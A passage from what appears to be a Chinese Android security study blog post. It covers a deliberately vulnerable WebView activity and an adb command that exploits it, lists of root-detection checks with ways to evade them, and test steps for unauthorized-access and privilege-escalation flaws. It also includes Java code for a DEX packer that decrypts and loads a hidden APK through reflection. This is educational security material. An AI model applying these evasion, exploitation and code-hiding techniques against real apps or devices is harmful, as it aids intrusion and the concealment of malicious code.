setContentView(C0816R.layout.activity_registration_web_view); <span class="hljs-comment">//设置活动的布局文件</span><br>        setTitle(<span class="hljs-string">&quot;Registration page&quot;</span>);   <span class="hljs-comment">//定义标题</span><br>        loadWebView();             <span class="hljs-comment">//加载WebView</span><br>    &#125;<br>   <br>    <span class="hljs-comment">//实现onCreate的最后一行loadWebView</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadWebView</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">WebView</span> <span class="hljs-variable">webView</span> <span class="hljs-operator">=</span> (WebView) findViewById(C0816R.C0819id.webview);  <span class="hljs-comment">//通过 findViewById 方法获取到布局文件中的 WebView 控件</span><br>        <span class="hljs-comment">//打印日志</span><br>        webView.setWebChromeClient(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebChromeClient</span>() &#123; <br>            <span class="hljs-meta">@Override</span><br>            <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">onConsoleMessage</span><span class="hljs-params">(ConsoleMessage consoleMessage)</span> &#123;<br>                Log.d(<span class="hljs-string">&quot;MyApplication&quot;</span>, consoleMessage.message() + <span class="hljs-string">&quot; -- From line &quot;</span> + consoleMessage.lineNumber() + <span class="hljs-string">&quot; of &quot;</span> + consoleMessage.sourceId());<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;);<br>        <span class="hljs-comment">//s&#x27;ge&#x27;z</span><br>        webView.setWebViewClient(<span class="hljs-keyword">new</span> <span class="hljs-title class_">WebViewClient</span>());<br>        webView.getSettings().setAllowUniversalAccessFromFileURLs(<span class="hljs-literal">true</span>);<br>        webView.getSettings().setJavaScriptEnabled(<span class="hljs-literal">true</span>);<br>        <span class="hljs-keyword">if</span> (getIntent().getExtras().getBoolean(<span class="hljs-string">&quot;is_reg&quot;</span>, <span class="hljs-literal">false</span>)) &#123;<br>            webView.loadUrl(<span class="hljs-string">&quot;file:///android_asset/registration.html&quot;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            webView.loadUrl(getIntent().getStringExtra(<span class="hljs-string">&quot;reg_url&quot;</span>));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>



<p>复现：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es reg_url &quot;http://www.baidu.com&quot;<br></code></pre></td></tr></table></figure>

<p>android8以下可以</p>
<p><img src="image-20240410213347069.png" srcset="/img/loading.gif" lazyload alt="image-20240410213347069"></p>
<hr>
<h4 id="android逆向"><a href="#android逆向" class="headerlink" title="android逆向"></a>android逆向</h4><h5 id="常规root检测"><a href="#常规root检测" class="headerlink" title="常规root检测"></a>常规root检测</h5><p>遍历目录：</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-string">&quot;/sbin/su&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;/system/bin/su&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;/system/sbin/su&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-string">&quot;/system/xbin/su&quot;</span><br></code></pre></td></tr></table></figure>

<p>新建文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/data、/system、/etc <br></code></pre></td></tr></table></figure>

<p>执行命令：</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">su，<span class="hljs-built_in">find</span>，mount<br></code></pre></td></tr></table></figure>

<p>读取手机编译版本、调试状态 例如读取&#x2F;system&#x2F;build.prop中 是test-keys（测试版），还是release-keys（发布版)，去获取ro.debuggable、ro.secure的值检测是否有调试状态</p>
<p>root检测指纹</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-number">1</span>.detectRootManagementApps—检测常见su包名,如&#123;“com<span class="hljs-selector-class">.noshufou</span><span class="hljs-selector-class">.android</span>.su”, “com<span class="hljs-selector-class">.noshufou</span><span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.su</span>.elite”, “eu<span class="hljs-selector-class">.chainfire</span>.supersu”, “com<span class="hljs-selector-class">.koushikdutta</span>.superuser”, “com<span class="hljs-selector-class">.thirdparty</span>.superuser”, “com<span class="hljs-selector-class">.yellowes</span>.su”, “com<span class="hljs-selector-class">.topjohnwu</span>.magisk”, “com<span class="hljs-selector-class">.kingroot</span>.kinguser”, “com<span class="hljs-selector-class">.kingo</span>.root”, “com<span class="hljs-selector-class">.smedialink</span>.oneclickroot”, “com<span class="hljs-selector-class">.zhiqupk</span><span class="hljs-selector-class">.root</span>.global”, “com<span class="hljs-selector-class">.alephzain</span>.framaroot”&#125;<br><br><span class="hljs-number">2</span>.detectPotentiallyDangerousApps—&#123;“com<span class="hljs-selector-class">.koushikdutta</span>.rommanager”, “com<span class="hljs-selector-class">.koushikdutta</span><span class="hljs-selector-class">.rommanager</span>.license”, “com<span class="hljs-selector-class">.dimonvideo</span>.luckypatcher”, “com<span class="hljs-selector-class">.chelpus</span>.lackypatch”, “com<span class="hljs-selector-class">.ramdroid</span>.appquarantine”, “com<span class="hljs-selector-class">.ramdroid</span>.appquarantinepro”, “com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.vending</span><span class="hljs-selector-class">.billing</span><span class="hljs-selector-class">.InAppBillingService</span>.COIN”, “com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.vending</span><span class="hljs-selector-class">.billing</span><span class="hljs-selector-class">.InAppBillingService</span>.LUCK”, “com<span class="hljs-selector-class">.chelpus</span>.luckypatcher”, “com.blackmartalpha”, “org<span class="hljs-selector-class">.blackmart</span>.market”, “com<span class="hljs-selector-class">.allinone</span>.free”, “com<span class="hljs-selector-class">.repodroid</span>.app”, “org<span class="hljs-selector-class">.creeplays</span>.hack”, “com<span class="hljs-selector-class">.baseappfull</span>.fwd”, “com.zmapp”, “com<span class="hljs-selector-class">.dv</span><span class="hljs-selector-class">.marketmod</span>.installer”, “org<span class="hljs-selector-class">.mobilism</span>.android”, “com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.wp</span><span class="hljs-selector-class">.net</span>.log”, “com<span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.camera</span>.update”, “cc<span class="hljs-selector-class">.madkite</span>.freedom”, “com<span class="hljs-selector-class">.solohsu</span><span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.edxp</span>.manager”, “org<span class="hljs-selector-class">.meowcat</span><span class="hljs-selector-class">.edxposed</span>.manager”, “com.xmodgame”, “com<span class="hljs-selector-class">.cih</span>.game_cih”, “com<span class="hljs-selector-class">.charles</span>.lpoqasert”, “catch_<span class="hljs-selector-class">.me_</span><span class="hljs-selector-class">.if_</span><span class="hljs-selector-class">.you_</span>.can_”&#125;<br><br><span class="hljs-number">3</span>.detectRootCloakingApps—&#123;“com<span class="hljs-selector-class">.devadvance</span>.rootcloak”, “com<span class="hljs-selector-class">.devadvance</span>.rootcloakplus”, “de<span class="hljs-selector-class">.robv</span><span class="hljs-selector-class">.android</span><span class="hljs-selector-class">.xposed</span>.installer”, “com<span class="hljs-selector-class">.saurik</span>.substrate”, “com<span class="hljs-selector-class">.zachspong</span>.temprootremovejb”, “com<span class="hljs-selector-class">.amphoras</span>.hidemyroot”, “com<span class="hljs-selector-class">.amphoras</span>.hidemyrootadfree”, “com<span class="hljs-selector-class">.formyhm</span>.hiderootPremium”, “com<span class="hljs-selector-class">.formyhm</span>.hideroot”&#125;<br><br><span class="hljs-number">4</span>.suPath—遍历执行可能存在的su文件夹,如&#123;“/data/local/”, “/data/local/bin/”, “/data/local/xbin/”, “/sbin/”, “/su/bin/”, “/system/bin/”, “/system/bin/.ext/”, “/system/bin/failsafe/”, “/system/sd/xbin/”, “/system/usr/we-need-root/”, “/system/xbin/”, “/cache/”, “/data/”, “/dev/”&#125;<br><br><span class="hljs-number">5</span>.checkForDangerousProps—检查一些属性的值.&#123;ro.debuggable”, “<span class="hljs-number">1</span>”&#125;,&#123;“ro.secure”, “<span class="hljs-number">0</span>”&#125;<br><br><span class="hljs-number">6</span>.checkForRWPaths—先执行(需要root)mount如果返回true然后再查看是否有读写权限&#123;“/system”, “/system/bin”, “/system/sbin”, “/system/xbin”, “/vendor/bin”, “/sbin”, “/etc”&#125;<br><br><span class="hljs-number">7</span>.detectTestKeys—查看编译类型是否为 &#123;“test-keys”&#125;<br><br><span class="hljs-number">8</span>.checkBuildProp—检查Buildprop的值,&#123;“ro<span class="hljs-selector-class">.build</span><span class="hljs-selector-class">.display</span>.id”,”ro<span class="hljs-selector-class">.build</span><span class="hljs-selector-class">.version</span>.incremental”,”ro<span class="hljs-selector-class">.build</span>.date”,”ro<span class="hljs-selector-class">.build</span><span class="hljs-selector-class">.date</span>.utc”,”ro<span class="hljs-selector-class">.build</span>.type”,”ro<span class="hljs-selector-class">.build</span>.user”,”ro<span class="hljs-selector-class">.build</span>.flavor”,”ro<span class="hljs-selector-class">.build</span>.tags”,”ro<span class="hljs-selector-class">.build</span>.description”,”ro<span class="hljs-selector-class">.build</span>.fingerprint”,”ro<span class="hljs-selector-class">.product</span>.model”,”ro<span class="hljs-selector-class">.product</span>.brand”,”ro<span class="hljs-selector-class">.product</span>.name”&#125;<br><br><span class="hljs-number">9</span>.checkSuExists—执行su,看看能否执行成功<br><br><span class="hljs-number">10</span>.checkForRootNative—Native层root检查<br><br><span class="hljs-number">11</span>.checkForMagiskBinary—检测是否存在Magisk-&#123;“/data/local/”, “/data/local/bin/”, “/data/local/xbin/”, “/sbin/”, “/su/bin/”, “/system/bin/”, “/system/bin/.ext/”, “/system/bin/failsafe/”, “/system/sd/xbin/”, “/system/usr/we-need-root/”, “/system/xbin/”, “/cache/”, “/data/”, “/dev/”&#125;<br></code></pre></td></tr></table></figure>

<p>绕过</p>
<ul>
<li>在&#x2F;system&#x2F;extras&#x2F;su&#x2F;Android.mk中修改su为需要的名称</li>
<li>&#x2F;system&#x2F;core&#x2F;libcutils&#x2F;fs_config.cpp中&#x2F;system&#x2F;xbin&#x2F;su修改为&#x2F;system&#x2F;xbin&#x2F;修改的名称</li>
<li>&#x2F;system&#x2F;sepolicy&#x2F;private&#x2F;file_contexts中&#x2F;system&#x2F;xbin&#x2F;su修改为&#x2F;system&#x2F;xbin&#x2F;修改的名称</li>
<li>修改特征</li>
<li>直接赋予adb为root权限</li>
</ul>
<p>app启动流程</p>
<p>startActivity&#x2F;startservice——–process.start———-zygotelinit runselectloop——–ActivityThread.main</p>
<h5 id="未授权访问测试"><a href="#未授权访问测试" class="headerlink" title="未授权访问测试"></a>未授权访问测试</h5><p>指用户在没有通过认证授权的情况下能够直接访问需要通过认证才能访问的页面或者信息：</p>
<ul>
<li>统计测试接口</li>
<li>使用抓包工具获得接口入参</li>
<li>不填写cookie或者填写无效cookie重新请求；</li>
<li>查看·请求结果，如果返回了正确cookie才能获取的结果，说明该接口存在未授权访问漏洞</li>
</ul>
<ul>
<li></li>
</ul>
<h5 id="越权访问测试"><a href="#越权访问测试" class="headerlink" title="越权访问测试"></a>越权访问测试</h5><p>通过抓包修改参数的方式绕过客户端实施攻击，从而测试师傅存在越权访问漏洞。</p>
<ul>
<li>统计测试接口；</li>
<li>使用抓包工具获取接口入参；</li>
<li>水平越权测试：分析入参中师傅标识用户身份的敏感信息，绕过存在，则修改为气她测试用户信息，重新请求查看返回结果，若返回结果正确，则该接口存在水平越权漏洞</li>
<li>垂直越权测试：分析高级权限用户的请求入参，将高权限用户信息替换为低级权限用户的信息，重新请求查看返回结果，若返回结果正确，则该接口存在垂直越权漏洞。</li>
</ul>
<h5 id="第一代壳：DEX加密（落地加载）"><a href="#第一代壳：DEX加密（落地加载）" class="headerlink" title="第一代壳：DEX加密（落地加载）"></a>第一代壳：DEX加密（落地加载）</h5><p><img src="image-20240303181212519.png" srcset="/img/loading.gif" lazyload alt="image-20240303181212519"></p>
<p>我们在加固的过程中需要三个对象：</p>
<p>1、需要加密的Apk(源Apk)</p>
<p>2、壳程序Apk(负责解密Apk工作)</p>
<p>3、加密工具(将源Apk进行加密和壳Dex合并成新的Dex)</p>
<p>需要加密的Apk和自己的壳程序Apk，然后用加密算法对源Apk进行加密在将壳Apk进行合并得到新的Dex文件，最后替换壳程序中的dex文件即可</p>
<p>重要的三个部分</p>
<ul>
<li>checksum：文件效验码，使用alder32算法校验文件除去magic，checksum外余下的所以文件区域，用于检查文件错误。</li>
<li>signature：使用SHA-1算法hash除去magic，checksum和signature外余下的所以文件区域，用于2唯一识别文本。</li>
<li>file_size：Dex文件的大小</li>
</ul>
<p>需要将一个文件(加密之后的源Apk)写入到Dex中，修改Dex的三个文件头，将源Apk的大小追加到壳dex的末尾</p>
<p><img src="informatin/book/笔记/image-20240303204739917.png" srcset="/img/loading.gif" lazyload alt="image-20240303204739917"></p>
<p>apkUnshell.app</p>
<p>第一段可以理解为初始化和动态环境配置，定义了相关变量</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span> <span class="hljs-comment">// 忽略未经检查的操作警告，比如使用了原生类型</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">attachBaseContext</span><span class="hljs-params">(Context base)</span> &#123;<br>    <span class="hljs-built_in">super</span>.attachBaseContext(base); <span class="hljs-comment">// 调用父类的attachBaseContext方法，设置上下文环境</span><br>    context = base; <span class="hljs-comment">// 保存传入的上下文对象到成员变量</span><br>    Log.e(TAG,<span class="hljs-string">&quot;attachBaseContext&quot;</span>); <span class="hljs-comment">// 使用日志记录方法调用，用于调试</span><br><br>    <br>    <br>    <span class="hljs-comment">// 下面代码块主要进行文件路径的准备和设置</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 创建私有目录用于存放优化后的DEX文件 PAYLOAD_ODEX等为定义</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">odexPathFile</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getDir(PAYLOAD_ODEX, MODE_PRIVATE);<br>        <span class="hljs-comment">// 创建私有目录用于存放加载的本地库文件（.so）</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">libsPathFile</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getDir(PAYLOAD_LIB, MODE_PRIVATE);<br>        <span class="hljs-comment">// 保存这些路径到成员变量中用于后续操作</span><br>        odexPath = odexPathFile.getAbsolutePath();<br>        libPath = libsPathFile.getAbsolutePath();<br>        srcDexFilePath = odexPathFile.getAbsolutePath() + <span class="hljs-string">&quot;/&quot;</span> + DEXFILENAME;<br><br>        <span class="hljs-comment">// 上面注释掉的代码块似乎是用于从Assets目录中提取文件的代码，</span><br>        <span class="hljs-comment">// 但在这段代码中并没有被使用</span><br>        <span class="hljs-comment">// 根据路径创建源DEX文件</span><br>        <span class="hljs-type">File</span> <span class="hljs-variable">srcDexFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(srcDexFilePath);<br>        <span class="hljs-comment">// 如果是第一次加载，说明dex文件尚未解密释放，所以需要进行这步操作</span><br>        <span class="hljs-keyword">if</span> (!srcDexFile.exists()) &#123;<br>            Log.e(TAG, <span class="hljs-string">&quot;beFirstLoading&quot;</span>);<br><br>            <span class="hljs-comment">// 创建新的dex文件</span><br>            srcDexFile.createNewFile();<br>            <span class="hljs-comment">// 从apk中读取dex文件</span><br>            <span class="hljs-type">byte</span>[] dexdata = <span class="hljs-built_in">this</span>.readDexFileFromApk();<br>            <span class="hljs-comment">// 从dex文件中提取出源apk资源，进行解密，存放到之前创建的文件目录中</span><br>            <span class="hljs-built_in">this</span>.splitPayLoadFromDex(dexdata);<br>        &#125;<br><br>        <br>        <br>        <br>        <br>        <br>        <span class="hljs-comment">// 下面代码块主要进行动态加载环境的配置</span><br>        <span class="hljs-comment">// 反射获取当前的ActivityThread对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">currentActivityThread</span> <span class="hljs-operator">=</span> RefInvoke.invokeStaticMethod(<br>            <span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, <span class="hljs-string">&quot;currentActivityThread&quot;</span>,<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;&#125;<br>        );<br>        <span class="hljs-comment">// 获取ActivityThread中的mPackages成员变量，它保存了所有已加载的包信息</span><br>        <span class="hljs-type">ArrayMap</span> <span class="hljs-variable">mPackages</span> <span class="hljs-operator">=</span> (ArrayMap) RefInvoke.getFieldOjbect(<br>            <span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread, <span class="hljs-string">&quot;mPackages&quot;</span><br>        );<br>        <span class="hljs-comment">// 获取当前应用的包名</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">packageName</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getPackageName();<br>        <span class="hljs-comment">// 根据包名找到当前应用的LoadedApk的弱引用</span><br>        <span class="hljs-type">WeakReference</span> <span class="hljs-variable">wr</span> <span class="hljs-operator">=</span> (WeakReference) mPackages.get(packageName);<br>        <span class="hljs-comment">// 使用源apk的DexClassLoader替换掉当前的ClassLoader</span><br>        <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">fathercl</span> <span class="hljs-operator">=</span> (ClassLoader) RefInvoke.getFieldOjbect(<br>            <span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>, wr.get(), <span class="hljs-string">&quot;mClassLoader&quot;</span><br>        );<br>        <span class="hljs-comment">// 创建新的DexClassLoader实例，指定dex路径、解压路径、库文件路径和父ClassLoader</span><br>        <span class="hljs-type">DexClassLoader</span> <span class="hljs-variable">dLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DexClassLoader</span>(<br>            srcDexFilePath, odexPath, libPath, fathercl<br>        );<br>        <span class="hljs-comment">// 用新的DexClassLoader实例替换LoadedApk中的mClassLoader字段</span><br>        RefInvoke.setFieldOjbect(<br>            <span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>, <span class="hljs-string">&quot;mClassLoader&quot;</span>, wr.get(), dLoader<br>        );<br>        <span class="hljs-comment">// 以下是调试代码，用于验证类是否成功加载</span><br>        <span class="hljs-comment">// Object actObj = dLoader.loadClass(LOADCLASSNAME);</span><br>        <span class="hljs-comment">// Log.e(TAG, &quot;get class object:&quot; + actObj);</span><br><br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        <span class="hljs-comment">// 如果有异常发生，记录堆栈信息用于调试</span><br>        Log.e(TAG, <span class="hljs-string">&quot;error:&quot;</span>+Log.getStackTraceString(e));<br>        e.printStackTrace();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>





<p>这段代码通过动态加载和反射替换了应用的<code>Application</code>实例，以此来加载被加固保护的原始代码和资源，使得原始APK的<code>Application</code>能够被实际使用</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SuppressWarnings(&quot;rawtypes&quot;)</span>  <span class="hljs-comment">// 注解可以用来抑制不同类型的警告</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onCreate</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>          Log.e(TAG, <span class="hljs-string">&quot;onCreate&quot;</span>);<br><br>          Log.e(TAG,<span class="hljs-string">&quot;Application:&quot;</span> + context + <span class="hljs-string">&quot;,BaseContext:&quot;</span> + getBaseContext() + <span class="hljs-string">&quot;,ApplicationContext:&quot;</span> + getApplicationContext() + <span class="hljs-string">&quot;,Activity:&quot;</span> + <span class="hljs-built_in">this</span>);<br><br>          <span class="hljs-keyword">if</span>(context == <span class="hljs-literal">null</span>)&#123;<br>              context = <span class="hljs-built_in">this</span>;<br>              <span class="hljs-keyword">if</span>(context == <span class="hljs-literal">null</span>)&#123;<br>                  context = Utils.getContext();<br>              &#125;<br>          &#125;<br><br>          <span class="hljs-comment">//加载源apk资源</span><br>          loadResources(srcDexFilePath);<br><br>          <span class="hljs-comment">//获取配置在清单文件的源Apk的Application路径</span><br>          <span class="hljs-type">String</span> <span class="hljs-variable">appClassName</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>          <span class="hljs-keyword">try</span> &#123;<br>              <span class="hljs-type">ApplicationInfo</span> <span class="hljs-variable">ai</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getPackageManager().getApplicationInfo(<span class="hljs-built_in">this</span>.getPackageName(),PackageManager.GET_META_DATA);<br>              <span class="hljs-type">Bundle</span> <span class="hljs-variable">bundle</span> <span class="hljs-operator">=</span> ai.metaData;<br>              <span class="hljs-keyword">if</span> (bundle != <span class="hljs-literal">null</span> &amp;&amp; bundle.containsKey(appkey)) &#123;<br>                  appClassName = bundle.getString(appkey);	<span class="hljs-comment">//className 是配置在xml文件中的</span><br>              &#125;<span class="hljs-keyword">else</span> &#123;<br>                  Log.e(TAG, <span class="hljs-string">&quot;not found class name of application in bundle&quot;</span>);<br>                  <span class="hljs-keyword">return</span>;<br>              &#125;<br>          &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>              Log.e(TAG, <span class="hljs-string">&quot;error:&quot;</span>+Log.getStackTraceString(e));<br>              e.printStackTrace();<br>              <span class="hljs-keyword">return</span>;<br>          &#125;<br><br>          <span class="hljs-comment">//获取当前壳Apk的ApplicationInfo</span><br>          <span class="hljs-type">Object</span> <span class="hljs-variable">currentActivityThread</span> <span class="hljs-operator">=</span> RefInvoke.invokeStaticMethod(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, <span class="hljs-string">&quot;currentActivityThread&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123;&#125;);<br><br>          <span class="hljs-type">Object</span> <span class="hljs-variable">mBoundApplication</span> <span class="hljs-operator">=</span> RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,<span class="hljs-string">&quot;mBoundApplication&quot;</span>);<br><br>          <span class="hljs-type">Object</span> <span class="hljs-variable">loadedApkInfo</span> <span class="hljs-operator">=</span> RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread$AppBindData&quot;</span>,mBoundApplication, <span class="hljs-string">&quot;info&quot;</span>);<br><br>          <span class="hljs-comment">//将LoadedApk中的ApplicationInfo设置为null</span><br>          RefInvoke.setFieldOjbect(<span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>, <span class="hljs-string">&quot;mApplication&quot;</span>,loadedApkInfo, <span class="hljs-literal">null</span>);<br><br>          <span class="hljs-comment">//获取currentActivityThread中注册的Application</span><br>          <span class="hljs-type">Object</span> <span class="hljs-variable">oldApplication</span> <span class="hljs-operator">=</span> RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread,<span class="hljs-string">&quot;mInitialApplication&quot;</span>);<br><br>          <span class="hljs-comment">//获取ActivityThread中所有已注册的Application，并将当前壳Apk的Application从中移除</span><br>          <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>          ArrayList&lt;Application&gt; mAllApplications = (ArrayList&lt;Application&gt;) RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread&quot;</span>, currentActivityThread, <span class="hljs-string">&quot;mAllApplications&quot;</span>);<br>          mAllApplications.remove(oldApplication);<br><br>          <span class="hljs-type">ApplicationInfo</span> <span class="hljs-variable">appinfo_In_LoadedApk</span> <span class="hljs-operator">=</span> (ApplicationInfo) RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>, loadedApkInfo,<span class="hljs-string">&quot;mApplicationInfo&quot;</span>);<br><br>          <span class="hljs-type">ApplicationInfo</span> <span class="hljs-variable">appinfo_In_AppBindData</span> <span class="hljs-operator">=</span> (ApplicationInfo) RefInvoke.getFieldOjbect(<span class="hljs-string">&quot;android.app.ActivityThread$AppBindData&quot;</span>,mBoundApplication, <span class="hljs-string">&quot;appInfo&quot;</span>);<br><br>          <span class="hljs-comment">//替换原来的Application</span><br>          appinfo_In_LoadedApk.className = appClassName;<br>          appinfo_In_AppBindData.className = appClassName;<br><br>          <span class="hljs-comment">//注册Application</span><br>          <span class="hljs-type">Application</span> <span class="hljs-variable">app</span> <span class="hljs-operator">=</span> (Application) RefInvoke.invokeMethod(<span class="hljs-string">&quot;android.app.LoadedApk&quot;</span>, <span class="hljs-string">&quot;makeApplication&quot;</span>,<br>                  loadedApkInfo,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; <span class="hljs-type">boolean</span>.class, Instrumentation.class &#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">false</span>, <span class="hljs-literal">null</span> &#125;);<br><br>          <span class="hljs-comment">//替换ActivityThread中的Application</span><br>          RefInvoke.setFieldOjbect(<span 